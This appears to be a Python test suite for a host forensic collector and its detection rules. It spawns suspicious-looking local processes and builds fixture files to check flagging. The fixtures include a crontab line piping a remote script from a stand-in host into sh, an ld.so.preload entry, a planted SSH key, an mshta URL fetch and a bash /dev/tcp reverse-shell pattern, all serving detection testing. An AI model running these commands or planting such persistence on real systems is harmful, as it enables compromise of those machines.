"""Tests of the live host collector. The 'real' tests start real processes / sockets on this machine (Linux only)
and check that the collector sees them and the rules react. Fixture tests use a fake root directory."""
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config
import correlate
import hostcollect
import normalize
import pipeline

LINUX = sys.platform.startswith("linux")


def collect_to(d, **kw):
    kw.setdefault("log", lambda *a: None)
    kw.setdefault("include_logs", False)
    return hostcollect.collect_host(d, **kw)


def analyze(d, cfg=None):
    cfg = cfg or dict(config.DEFAULT_CASE, case_id="T")
    return pipeline.run_case(d, os.path.join(d, "case"), cfg, make_report=False)


def flags_of(ctx):
    return {f for e in ctx["events"] for f in e["flags"]}


@unittest.skipUnless(LINUX, "real-process tests run on Linux")
class RealProcesses(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(dir="/tmp")
        self.procs = []

    def tearDown(self):
        for p in self.procs:
            p.kill()
            p.wait()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _spawn_from_tmp(self, name="updater"):
        exe = os.path.join(self.tmp, name)
        shutil.copy2("/bin/sleep", exe)
        os.chmod(exe, 0o755)
        p = subprocess.Popen([exe, "120"])
        self.procs.append(p)
        time.sleep(0.4)
        return exe, p

    def test_process_running_from_tmp_is_collected_hashed_and_flagged(self):
        exe, p = self._spawn_from_tmp()
        out = tempfile.mkdtemp()
        collect_to(out)
        procs = json.load(open(os.path.join(out, "host", "processes.json")))["items"]
        mine = [x for x in procs if x["pid"] == p.pid]
        self.assertEqual(len(mine), 1)
        self.assertEqual(mine[0]["exe"], exe)
        self.assertEqual(mine[0]["exe_sha256"], hostcollect.sha256_file(exe))
        ctx = analyze(out)
        self.assertIn("process_from_temp", flags_of(ctx))
        self.assertIn("executable_in_temp", flags_of(ctx))            # the same binary as a recent ELF file in /tmp
        self.assertTrue(ctx["custody_ok"])
        shutil.rmtree(out)

    def test_deleted_binary_still_running(self):
        exe, p = self._spawn_from_tmp("ghost")
        os.remove(exe)
        time.sleep(0.2)
        out = tempfile.mkdtemp()
        collect_to(out)
        mine = [x for x in json.load(open(os.path.join(out, "host", "processes.json")))["items"] if x["pid"] == p.pid][0]
        self.assertTrue(mine["exe_deleted"])
        self.assertIn("deleted_executable_running", flags_of(analyze(out)))
        shutil.rmtree(out)

    @staticmethod
    def _own_ip():
        """A non-loopback IPv4 address of this machine (loopback is ignored by the parser by design)."""
        import psutil
        for name, addrs in psutil.net_if_addrs().items():
            for a in addrs:
                if a.family == socket.AF_INET and not a.address.startswith("127."):
                    return a.address
        return None

    def test_real_socket_is_collected_and_rules_link_it_to_the_log_ip(self):
        ip = self._own_ip()
        if not ip:
            self.skipTest("no non-loopback interface")
        if config.is_internal(ip):
            self.skipTest(f"interface address {ip} is a private address; the rule needs an external-looking peer")
        srv = socket.socket()
        srv.bind((ip, 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        # the trailing 'true' stops bash from exec-ing sleep; '3>&-' keeps the socket owned by bash alone
        sh = subprocess.Popen(["bash", "-c", f"exec 3<>/dev/tcp/{ip}/{port}; sleep 120 3>&-; true"])
        self.procs.append(sh)
        conn, _ = srv.accept()
        time.sleep(0.4)
        out = tempfile.mkdtemp()
        collect_to(out)
        conns = json.load(open(os.path.join(out, "host", "connections.json")))["items"]
        self.assertTrue(any(c["pid"] == sh.pid and c["remote_port"] == port and c["status"] == "ESTABLISHED" for c in conns))
        # a matching brute-force burst from the same address in auth.log
        lines = [f"Sep 29 02:00:{i:02d} web01 sshd[1]: Failed password for root from {ip} port 22 ssh2" for i in range(6)]
        lines.append(f"Sep 29 02:01:00 web01 sshd[1]: Accepted password for root from {ip} port 22 ssh2")
        open(os.path.join(out, "auth.log"), "w").write("\n".join(lines) + "\n")
        ctx = analyze(out, dict(config.DEFAULT_CASE, case_id="T", linux_timezone_offset="+00:00", linux_log_year=2026))
        fl = flags_of(ctx)
        self.assertIn("shell_network_connection", fl)
        self.assertIn("reverse_shell_pattern", fl)
        self.assertIn("brute_force_success", fl)
        inc = [i for i in ctx["corr"]["incidents"] if {"linux", "host"} <= set(i["platforms"])]
        self.assertEqual(len(inc), 1, [i["platforms"] for i in ctx["corr"]["incidents"]])     # log evidence + live process = ONE incident
        conn.close()
        srv.close()
        shutil.rmtree(out)

    def test_fileless_memfd_process(self):
        try:
            fd = os.memfd_create("implant", 0)
            os.write(fd, open("/bin/sleep", "rb").read())
            p = subprocess.Popen([f"/proc/self/fd/{fd}", "120"], pass_fds=[fd])
        except (AttributeError, OSError, PermissionError) as e:
            self.skipTest(f"cannot execute from memfd here: {e}")
        self.procs.append(p)
        time.sleep(0.4)
        out = tempfile.mkdtemp()
        collect_to(out)
        mine = [e for e in analyze(out)["events"] if e["event_type"] == "process_snapshot" and (e["extra"] or {}).get("pid") == p.pid]
        self.assertEqual(len(mine), 1)
        self.assertIn("fileless_memfd_process", mine[0]["flags"])
        self.assertNotIn("deleted_executable_running", mine[0]["flags"])
        shutil.rmtree(out)
        os.close(fd)

    def test_timestomped_binary_is_still_found(self):
        exe = os.path.join(self.tmp, "dropper")
        shutil.copy2("/bin/sleep", exe)
        old = time.time() - 400 * 86400
        os.utime(exe, (old, old))                                    # attacker sets the modification time back a year
        out = tempfile.mkdtemp()
        collect_to(out)
        fl = [e for e in analyze(out)["events"] if e["target"] == exe]
        self.assertEqual(len(fl), 1)
        self.assertIn("executable_in_temp", fl[0]["flags"])
        self.assertIn("timestomped_file", fl[0]["flags"])
        shutil.rmtree(out)

    def test_benign_process_is_not_flagged(self):
        p = subprocess.Popen(["/bin/sleep", "120"])
        self.procs.append(p)
        out = tempfile.mkdtemp()
        collect_to(out)
        ctx = analyze(out)
        mine = [e for e in ctx["events"] if e["event_type"] == "process_snapshot" and (e["extra"] or {}).get("pid") == p.pid]
        self.assertEqual(len(mine), 1)
        self.assertEqual(mine[0]["flags"], [])
        shutil.rmtree(out)

    def test_manifest_hashes_match_files(self):
        out = tempfile.mkdtemp()
        m = collect_to(out)
        self.assertGreaterEqual(len(m["artifacts"]), 6)
        for a in m["artifacts"]:
            self.assertEqual(hostcollect.sha256_file(os.path.join(out, "host", a["name"])), a["sha256"])
        shutil.rmtree(out)

    def test_collector_does_not_list_its_own_output(self):
        out = tempfile.mkdtemp(dir="/tmp")
        collect_to(out)
        files = json.load(open(os.path.join(out, "host", "files.json")))["items"]
        self.assertFalse(any(f["path"].startswith(out) for f in files))
        shutil.rmtree(out)


@unittest.skipUnless(LINUX, "fixture root uses Linux paths")
class FixtureRoot(unittest.TestCase):
    def _root(self, key_age_days=0):
        root = tempfile.mkdtemp()
        w = lambda rel, txt: (os.makedirs(os.path.dirname(os.path.join(root, rel)), exist_ok=True), open(os.path.join(root, rel), "w").write(txt))
        w("etc/passwd", "root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/home/toor:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n")
        w("etc/group", "sudo:x:27:bob\nroot:x:0:\n")
        w("etc/crontab", "# m h dom mon dow user command\nSHELL=/bin/sh\n*/5 * * * * root curl http://198.51.100.9/x.sh | sh\n0 3 * * * root /usr/sbin/logrotate\n")
        w("etc/systemd/system/upd.service", "[Service]\nExecStart=/tmp/.hidden/upd\n")
        w("etc/systemd/system/ok.service", "[Service]\nExecStart=/usr/sbin/nginx\n")
        w("etc/ld.so.preload", "/tmp/libevil.so\n")
        w("home/bob/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabc attacker@box\n")
        if key_age_days:
            t = time.time() - key_age_days * 86400
            os.utime(os.path.join(root, "home/bob/.ssh/authorized_keys"), (t, t))
        return root

    def test_persistence_and_account_rules(self):
        root = self._root()
        out = tempfile.mkdtemp()
        collect_to(out, fs_root=root)
        fl = flags_of(analyze(out))
        for f in ("cron_persistence", "systemd_persistence", "ld_preload_set", "uid0_duplicate", "authorized_keys_recent_change"):
            self.assertIn(f, fl)
        # the harmless cron line and the harmless unit must not be flagged
        ctx = analyze(out)
        for e in ctx["events"]:
            if e["event_type"] == "persistence_entry" and ("logrotate" in (e["detail"] or "") or "nginx" in (e["detail"] or "")):
                self.assertEqual(e["flags"], [], e["detail"])
        shutil.rmtree(root)
        shutil.rmtree(out)

    def test_old_authorized_key_is_not_flagged(self):
        root = self._root(key_age_days=90)
        out = tempfile.mkdtemp()
        collect_to(out, fs_root=root)
        self.assertNotIn("authorized_keys_recent_change", flags_of(analyze(out)))
        shutil.rmtree(root)
        shutil.rmtree(out)


class Parsers(unittest.TestCase):
    def test_authorized_keys(self):
        k = hostcollect.parse_authorized_keys('# c\ncommand="x",no-pty ssh-rsa AAAAB3Nza me@pc\nssh-ed25519 AAAAC3 other\n')
        self.assertEqual([x["type"] for x in k], ["ssh-rsa", "ssh-ed25519"])
        self.assertEqual(k[0]["comment"], "me@pc")
        self.assertIn("no-pty", k[0]["options"])

    def test_crontab_skips_comments_and_env(self):
        self.assertEqual(hostcollect.parse_crontab("# x\nSHELL=/bin/sh\n\n* * * * * root id\n"), ["* * * * * root id"])

    def test_systemd_unit(self):
        self.assertEqual(hostcollect.parse_systemd_unit("[Service]\nExecStart=/a b\nExecStartPre=/c\nUser=x\n"), ["/a b", "/c"])

    def test_net_user_parsing(self):
        txt = ("\nUser accounts for \\\\PC\n\n-------------------------------------------------------------------------------\n"
               "Administrator            DefaultAccount           Guest\nbob                      WDAGUtilityAccount\nThe command completed successfully.\n")
        self.assertEqual(hostcollect.parse_net_user(txt), ["Administrator", "DefaultAccount", "Guest", "bob", "WDAGUtilityAccount"])

    def test_schtasks_csv(self):
        row = '"PC","\\Updater","N/A","Ready","Interactive/Background","N/A","1","me","powershell -enc AAA","N/A","N/A","Enabled","Disabled","Stop","user1"\n'
        t = hostcollect.parse_schtasks_csv(row)
        self.assertEqual((t[0]["task"], t[0]["run"], t[0]["run_as"]), ("\\Updater", "powershell -enc AAA", "user1"))

    def test_windows_rules_on_synthetic_artifacts(self):
        d = tempfile.mkdtemp()
        os.makedirs(os.path.join(d, "host"))
        j = lambda n, o: json.dump(o, open(os.path.join(d, "host", n), "w"))
        j("system.json", dict(hostname="PC1", collected_at="2026-09-29T00:00:00Z", os="Windows", is_admin=True))
        j("processes.json", dict(items=[dict(pid=4, ppid=1, name="mshta.exe", exe=r"C:\Windows\System32\mshta.exe", cmdline=["mshta.exe", "http://evil/x.hta"], username="u", create_time_utc="2026-09-28T23:00:00Z")]))
        j("persistence.json", dict(items=[dict(kind="run_key", name=r"HKCU\...\Run\x", value=r"C:\Users\u\AppData\Local\Temp\a.exe", mtime=None),
                                          dict(kind="run_key", name=r"HKLM\...\Run\ok", value=r"C:\Program Files\App\app.exe", mtime=None)]))
        ctx = pipeline.run_case(d, os.path.join(d, "case"), dict(config.DEFAULT_CASE, case_id="W"), make_report=False)
        fl = flags_of(ctx)
        self.assertIn("lolbin_abuse", fl)
        self.assertIn("registry_persistence", fl)
        ok = [e for e in ctx["events"] if e["target"] and "Program Files" in e["target"] + (e["detail"] or "")]
        self.assertTrue(ok and all(not e["flags"] for e in ok))


if __name__ == "__main__":
    unittest.main()
